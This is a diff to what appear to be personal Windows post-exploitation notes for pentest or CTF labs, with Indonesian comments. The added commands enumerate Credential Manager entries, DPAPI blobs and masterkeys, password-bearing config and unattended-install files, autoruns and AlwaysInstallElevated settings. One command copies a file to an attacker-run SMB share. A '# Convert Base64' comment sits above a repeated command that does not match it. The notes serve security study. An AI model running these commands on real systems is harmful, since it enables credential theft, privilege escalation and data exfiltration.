@@ -31,7 +31,8 @@ dir C:\Users\ /s /b 2>nul | findstr /i "user.txt\|local.txt\|proof.txt"
 Untuk melihat ==OS Name== dan ==System Type==
 ```powershell
 # Untuk CMD 
-systemswinfo
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 echo %PROCESSOR_ARCHITECTURE%
 
@@ -52,7 +53,8 @@ sc query windefend
 net user <nama user>
 host
 whoami /priv #dahulukan ini
-whoami /group
+whoami /groups
+whoami /all
 ```
 ![](Attachments/Pasted%20image%2020260625053212.png)
 yang berbahaya  pada whoami /priv
@@ -68,6 +70,11 @@ net localgroup administrators
 ```powershell
 hostname #cek komputer apa
 ipconfig #cek apakah ada another network
+
+ipconfig /all
+route print
+netstat -ano
+arp -a
 ```
 pada gambar dibawah ada another network
 ![](Attachments/Pasted%20image%2020260625053943.png)
@@ -76,11 +83,25 @@ Scan ip apa saja yang aktif
 1..255 | ForEach-Object { $ip = "192.168.100.$_"; if (Test-NetConnection -ComputerName $ip -InformationLevel Quiet -ErrorAction SilentlyContinue) { $ip } }
 ```
 ![](Attachments/Pasted%20image%2020260625094620.png)
-## f. Cek Share
+## f. Saved Credentials
+```powershell
+# Windows Credential Manager entries — check this FIRST
+cmdkey /list
+
+# DPAPI-protected credential blobs                      
+dir /a /s %APPDATA%\Microsoft\Credentials\
+Get-ChildItem -Path $env:APPDATA\Microsoft\Credentials\ -Force -Recurse
+
+# DPAPI masterkeys (need this to decrypt above)       
+dir /a /s %APPDATA%\Microsoft\Protect\
+Get-ChildItem -Path $env:APPDATA\Microsoft\Protect\ -Force -Recurse 
+```
+![](Attachments/Pasted%20image%2020260908105929.png)
+## g. Cek Share
 ```powershell
 cd C:\Shares\
 ```
-## g. Password file
+## h. Password file
 ```powershell
 # CMD
 findstr /si password *.ini *.config
@@ -90,6 +111,26 @@ Get-ChildItem -Include *.ini, *.config -Recurse | Select-String "password"
 
 # Current folder
 Select-String -Path * -Pattern "password" 
+
+findstr /si password *.txt *.ini *.config *.xml *.ps1 2>nul
+dir /s /b *pass* == *cred* == *.kdbx 2>nul
+type C:\inetpub\wwwroot\web.config 2>nul                  # IIS app configs
+dir C:\Windows\Panther\Unattend.xml 2>nul                 # unattended install creds
+dir C:\Windows\System32\sysprep\sysprep.xml 2>nul
+type C:\Windows\System32\drivers\etc\hosts                # sometimes reveals internal infra
+```
+
+## i. Cek Autoruns
+```powershell
+# unquoted paths + non-default binaries
+wmic service get name,pathname,startmode,startname | findstr /i /v "C:\Windows"  
+
+# scheduled tasks
+schtasks /query /fo LIST /v                                                        
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 # 3. Schedule Task
 ## Siapa yang menjalankan program UpdateChecker Agent (misal)?
@@ -147,6 +188,9 @@ sudo impacket-smbserver share . -smb2support -username test -password test
 # kirim dari windows
 net use \\10.10.15.236\share /user:test test
 copy SmarterMail.Standard.dll \\10.10.15.236\share\
+
+# Convert Base64
+sudo impacket-smbserver share . -smb2support -username test -password test
 ```
 ![](Attachments/Pasted%20image%2020260901142257.png)
 ![](Attachments/Pasted%20image%2020260901142402.png)
